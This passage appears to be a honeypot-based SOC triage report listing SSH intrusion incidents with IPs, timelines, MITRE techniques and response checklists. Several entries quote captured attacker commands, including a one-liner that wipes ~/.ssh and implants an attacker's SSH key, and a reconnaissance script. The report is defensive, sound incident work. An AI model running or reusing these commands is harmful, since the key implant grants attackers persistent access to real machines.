| **Source IP** | `210.13.99[.]66` |
| **First Seen** | 2026-07-17 05:47 |
| **Last Seen** | 2026-07-17 05:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:47:04` | `cowrie.session.connect` |
| `2026-07-17 05:47:04` | `cowrie.client.version` |
| `2026-07-17 05:47:04` | `cowrie.client.kex` |
| `2026-07-17 05:47:06` | `cowrie.login.success` |
| `2026-07-17 05:47:07` | `cowrie.direct-tcpip.request` |
| `2026-07-17 05:47:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.13.99[.]66` to AbuseIPDB if not already reported
- [ ] Block `210.13.99[.]66` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62f654a0147f

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-17 05:47 |
| **Last Seen** | 2026-07-17 05:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:47:25` | `cowrie.session.connect` |
| `2026-07-17 05:47:25` | `cowrie.client.version` |
| `2026-07-17 05:47:25` | `cowrie.client.kex` |
| `2026-07-17 05:47:25` | `cowrie.login.success` |
| `2026-07-17 05:47:26` | `cowrie.session.params` |
| `2026-07-17 05:47:26` | `cowrie.command.input` |
| `2026-07-17 05:47:26` | `cowrie.log.closed` |
| `2026-07-17 05:47:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed37dac1f6e7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 05:48 |
| **Last Seen** | 2026-07-17 05:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:48:17` | `cowrie.session.connect` |
| `2026-07-17 05:48:17` | `cowrie.client.version` |
| `2026-07-17 05:48:17` | `cowrie.client.kex` |
| `2026-07-17 05:48:19` | `cowrie.login.success` |
| `2026-07-17 05:48:20` | `cowrie.session.params` |
| `2026-07-17 05:48:20` | `cowrie.command.input` |
| `2026-07-17 05:48:20` | `cowrie.command.input` |
| `2026-07-17 05:48:20` | `cowrie.command.input` |
| `2026-07-17 05:48:20` | `cowrie.command.input` |
| `2026-07-17 05:48:20` | `cowrie.command.input` |
| `2026-07-17 05:48:20` | `cowrie.command.success` |
| `2026-07-17 05:48:20` | `cowrie.command.input` |
| `2026-07-17 05:48:20` | `cowrie.command.input` |
| `2026-07-17 05:48:20` | `cowrie.command.input` |
| `2026-07-17 05:48:20` | `cowrie.command.input` |
| `2026-07-17 05:48:21` | `cowrie.log.closed` |
| `2026-07-17 05:48:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b486fa2f494

| Field | Detail |
|---|---|
| **Source IP** | `20.204.3[.]211` |
| **First Seen** | 2026-07-17 05:48 |
| **Last Seen** | 2026-07-17 05:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:48:34` | `cowrie.session.connect` |
| `2026-07-17 05:48:34` | `cowrie.client.version` |
| `2026-07-17 05:48:34` | `cowrie.client.kex` |
| `2026-07-17 05:48:35` | `cowrie.login.success` |
| `2026-07-17 05:48:36` | `cowrie.session.params` |
| `2026-07-17 05:48:36` | `cowrie.command.input` |
| `2026-07-17 05:48:36` | `cowrie.command.failed` |
| `2026-07-17 05:48:36` | `cowrie.log.closed` |
| `2026-07-17 05:48:37` | `cowrie.session.params` |
| `2026-07-17 05:48:37` | `cowrie.command.input` |
| `2026-07-17 05:48:37` | `cowrie.session.file_download` |
| `2026-07-17 05:48:37` | `cowrie.log.closed` |
| `2026-07-17 05:48:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.204.3[.]211` to AbuseIPDB if not already reported
- [ ] Block `20.204.3[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59ed170951b2

| Field | Detail |
|---|---|
| **Source IP** | `20.204.3[.]211` |
| **First Seen** | 2026-07-17 05:48 |
| **Last Seen** | 2026-07-17 05:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:48:37` | `cowrie.session.connect` |
| `2026-07-17 05:48:37` | `cowrie.client.version` |
| `2026-07-17 05:48:38` | `cowrie.client.kex` |
| `2026-07-17 05:48:38` | `cowrie.login.success` |
| `2026-07-17 05:48:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.204.3[.]211` to AbuseIPDB if not already reported
- [ ] Block `20.204.3[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-900675bf826a

| Field | Detail |
|---|---|
| **Source IP** | `20.204.3[.]211` |
| **First Seen** | 2026-07-17 05:48 |
| **Last Seen** | 2026-07-17 05:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:48:39` | `cowrie.session.connect` |
| `2026-07-17 05:48:39` | `cowrie.client.version` |
| `2026-07-17 05:48:39` | `cowrie.client.kex` |
| `2026-07-17 05:48:40` | `cowrie.login.success` |
| `2026-07-17 05:48:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.204.3[.]211` to AbuseIPDB if not already reported
- [ ] Block `20.204.3[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26f8192da7ac

| Field | Detail |
|---|---|
| **Source IP** | `182.43.221[.]112` |
| **First Seen** | 2026-07-17 05:49 |
| **Last Seen** | 2026-07-17 05:53 |
| **Session Duration** | 253s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:49:32` | `cowrie.session.connect` |
| `2026-07-17 05:49:32` | `cowrie.client.version` |
| `2026-07-17 05:49:32` | `cowrie.client.kex` |
| `2026-07-17 05:49:33` | `cowrie.login.success` |
| `2026-07-17 05:49:35` | `cowrie.session.params` |
| `2026-07-17 05:49:35` | `cowrie.command.input` |
| `2026-07-17 05:49:35` | `cowrie.command.failed` |
| `2026-07-17 05:53:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.43.221[.]112` to AbuseIPDB if not already reported
- [ ] Block `182.43.221[.]112` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebc26ef59647

| Field | Detail |
|---|---|
| **Source IP** | `47.254.74[.]209` |
| **First Seen** | 2026-07-17 05:49 |
| **Last Seen** | 2026-07-17 05:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:49:57` | `cowrie.session.connect` |
| `2026-07-17 05:49:57` | `cowrie.client.version` |
| `2026-07-17 05:49:57` | `cowrie.client.kex` |
| `2026-07-17 05:49:58` | `cowrie.login.success` |
| `2026-07-17 05:49:58` | `cowrie.session.params` |
| `2026-07-17 05:49:58` | `cowrie.command.input` |
| `2026-07-17 05:49:58` | `cowrie.command.failed` |
| `2026-07-17 05:49:58` | `cowrie.log.closed` |
| `2026-07-17 05:49:59` | `cowrie.session.params` |
| `2026-07-17 05:49:59` | `cowrie.command.input` |
| `2026-07-17 05:49:59` | `cowrie.session.file_download` |
| `2026-07-17 05:49:59` | `cowrie.log.closed` |
| `2026-07-17 05:50:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.254.74[.]209` to AbuseIPDB if not already reported
- [ ] Block `47.254.74[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-853c5d660c89

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 05:49 |
| **Last Seen** | 2026-07-17 05:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:49:58` | `cowrie.session.connect` |
| `2026-07-17 05:49:59` | `cowrie.client.version` |
| `2026-07-17 05:49:59` | `cowrie.client.kex` |
| `2026-07-17 05:50:00` | `cowrie.login.success` |
| `2026-07-17 05:50:02` | `cowrie.session.params` |
| `2026-07-17 05:50:02` | `cowrie.command.input` |
| `2026-07-17 05:50:02` | `cowrie.command.input` |
| `2026-07-17 05:50:02` | `cowrie.command.input` |
| `2026-07-17 05:50:02` | `cowrie.command.input` |
| `2026-07-17 05:50:02` | `cowrie.command.input` |
| `2026-07-17 05:50:02` | `cowrie.command.success` |
| `2026-07-17 05:50:02` | `cowrie.command.input` |
| `2026-07-17 05:50:02` | `cowrie.command.input` |
| `2026-07-17 05:50:02` | `cowrie.command.input` |
| `2026-07-17 05:50:02` | `cowrie.command.input` |
| `2026-07-17 05:50:02` | `cowrie.log.closed` |
| `2026-07-17 05:50:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d00f6890e3b5

| Field | Detail |
|---|---|
| **Source IP** | `47.254.74[.]209` |
| **First Seen** | 2026-07-17 05:49 |
| **Last Seen** | 2026-07-17 05:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:49:59` | `cowrie.session.connect` |
| `2026-07-17 05:49:59` | `cowrie.client.version` |
| `2026-07-17 05:49:59` | `cowrie.client.kex` |
| `2026-07-17 05:50:00` | `cowrie.login.success` |
| `2026-07-17 05:50:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.254.74[.]209` to AbuseIPDB if not already reported
- [ ] Block `47.254.74[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fe31ba5eabb

| Field | Detail |
|---|---|
| **Source IP** | `47.254.74[.]209` |
| **First Seen** | 2026-07-17 05:50 |
| **Last Seen** | 2026-07-17 05:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:50:00` | `cowrie.session.connect` |
| `2026-07-17 05:50:00` | `cowrie.client.version` |
| `2026-07-17 05:50:00` | `cowrie.client.kex` |
| `2026-07-17 05:50:00` | `cowrie.login.success` |
| `2026-07-17 05:50:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.254.74[.]209` to AbuseIPDB if not already reported
- [ ] Block `47.254.74[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36611b8a3ae0

| Field | Detail |
|---|---|
| **Source IP** | `160.251.202[.]248` |
| **First Seen** | 2026-07-17 05:50 |
| **Last Seen** | 2026-07-17 05:50 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:50:41` | `cowrie.session.connect` |
| `2026-07-17 05:50:41` | `cowrie.client.version` |
| `2026-07-17 05:50:41` | `cowrie.client.kex` |
| `2026-07-17 05:50:42` | `cowrie.login.success` |
| `2026-07-17 05:50:43` | `cowrie.session.params` |
| `2026-07-17 05:50:43` | `cowrie.command.input` |
| `2026-07-17 05:50:43` | `cowrie.command.failed` |
| `2026-07-17 05:50:43` | `cowrie.log.closed` |
| `2026-07-17 05:50:44` | `cowrie.session.params` |
| `2026-07-17 05:50:44` | `cowrie.command.input` |
| `2026-07-17 05:50:44` | `cowrie.session.file_download` |
| `2026-07-17 05:50:44` | `cowrie.log.closed` |
| `2026-07-17 05:50:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.251.202[.]248` to AbuseIPDB if not already reported
- [ ] Block `160.251.202[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c827376b7146

| Field | Detail |
|---|---|
| **Source IP** | `160.251.202[.]248` |
| **First Seen** | 2026-07-17 05:50 |
| **Last Seen** | 2026-07-17 05:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:50:44` | `cowrie.session.connect` |
| `2026-07-17 05:50:44` | `cowrie.client.version` |
| `2026-07-17 05:50:44` | `cowrie.client.kex` |
| `2026-07-17 05:50:45` | `cowrie.login.success` |
| `2026-07-17 05:50:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.251.202[.]248` to AbuseIPDB if not already reported
- [ ] Block `160.251.202[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59db0360e5d1

| Field | Detail |
|---|---|
| **Source IP** | `160.251.202[.]248` |
| **First Seen** | 2026-07-17 05:50 |
| **Last Seen** | 2026-07-17 05:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:50:46` | `cowrie.session.connect` |
| `2026-07-17 05:50:46` | `cowrie.client.version` |
| `2026-07-17 05:50:46` | `cowrie.client.kex` |
| `2026-07-17 05:50:47` | `cowrie.login.success` |
| `2026-07-17 05:50:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.251.202[.]248` to AbuseIPDB if not already reported
- [ ] Block `160.251.202[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ed288c0cb39

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 05:51 |
| **Last Seen** | 2026-07-17 05:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:51:39` | `cowrie.session.connect` |
| `2026-07-17 05:51:39` | `cowrie.client.version` |
| `2026-07-17 05:51:39` | `cowrie.client.kex` |
| `2026-07-17 05:51:41` | `cowrie.login.success` |
| `2026-07-17 05:51:42` | `cowrie.session.params` |
| `2026-07-17 05:51:42` | `cowrie.command.input` |
| `2026-07-17 05:51:42` | `cowrie.command.input` |
| `2026-07-17 05:51:42` | `cowrie.command.input` |
| `2026-07-17 05:51:42` | `cowrie.command.input` |
| `2026-07-17 05:51:42` | `cowrie.command.input` |
| `2026-07-17 05:51:42` | `cowrie.command.success` |
| `2026-07-17 05:51:42` | `cowrie.command.input` |
| `2026-07-17 05:51:42` | `cowrie.command.input` |
| `2026-07-17 05:51:42` | `cowrie.command.input` |
| `2026-07-17 05:51:42` | `cowrie.command.input` |
| `2026-07-17 05:51:42` | `cowrie.log.closed` |
| `2026-07-17 05:51:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-156a729cd826

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 05:53 |
| **Last Seen** | 2026-07-17 05:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:53:19` | `cowrie.session.connect` |
| `2026-07-17 05:53:19` | `cowrie.client.version` |
| `2026-07-17 05:53:19` | `cowrie.client.kex` |
| `2026-07-17 05:53:20` | `cowrie.login.success` |
| `2026-07-17 05:53:21` | `cowrie.session.params` |
| `2026-07-17 05:53:21` | `cowrie.command.input` |
| `2026-07-17 05:53:21` | `cowrie.command.input` |
| `2026-07-17 05:53:21` | `cowrie.command.input` |
| `2026-07-17 05:53:21` | `cowrie.command.input` |
| `2026-07-17 05:53:21` | `cowrie.command.input` |
| `2026-07-17 05:53:21` | `cowrie.command.success` |
| `2026-07-17 05:53:21` | `cowrie.command.input` |
| `2026-07-17 05:53:21` | `cowrie.command.input` |
| `2026-07-17 05:53:21` | `cowrie.command.input` |
| `2026-07-17 05:53:22` | `cowrie.command.input` |
| `2026-07-17 05:53:22` | `cowrie.log.closed` |
| `2026-07-17 05:53:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-faf23c6fa51f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 05:55 |
| **Last Seen** | 2026-07-17 05:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 05:55:01` | `cowrie.session.connect` |
| `2026-07-17 05:55:01` | `cowrie.client.version` |
| `2026-07-17 05:55:01` | `cowrie.client.kex` |
| `2026-07-17 05:55:03` | `cowrie.login.success` |
| `2026-07-17 05:55:04` | `cowrie.session.params` |
| `2026-07-17 05:55:04` | `cowrie.command.input` |
| `2026-07-17 05:55:04` | `cowrie.command.input` |
| `2026-07-17 05:55:04` | `cowrie.command.input` |
| `2026-07-17 05:55:04` | `cowrie.command.input` |
| `2026-07-17 05:55:04` | `cowrie.command.input` |
| `2026-07-17 05:55:04` | `cowrie.command.success` |
| `2026-07-17 05:55:04` | `cowrie.command.input` |
| `2026-07-17 05:55:04` | `cowrie.command.input` |
| `2026-07-17 05:55:04` | `cowrie.command.input` |
| `2026-07-17 05:55:04` | `cowrie.command.input` |
| `2026-07-17 05:55:04` | `cowrie.log.closed` |
| `2026-07-17 05:55:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c506a18fbdf6

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 05:56 |
| **Last Seen** | 2026-07-17 05:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
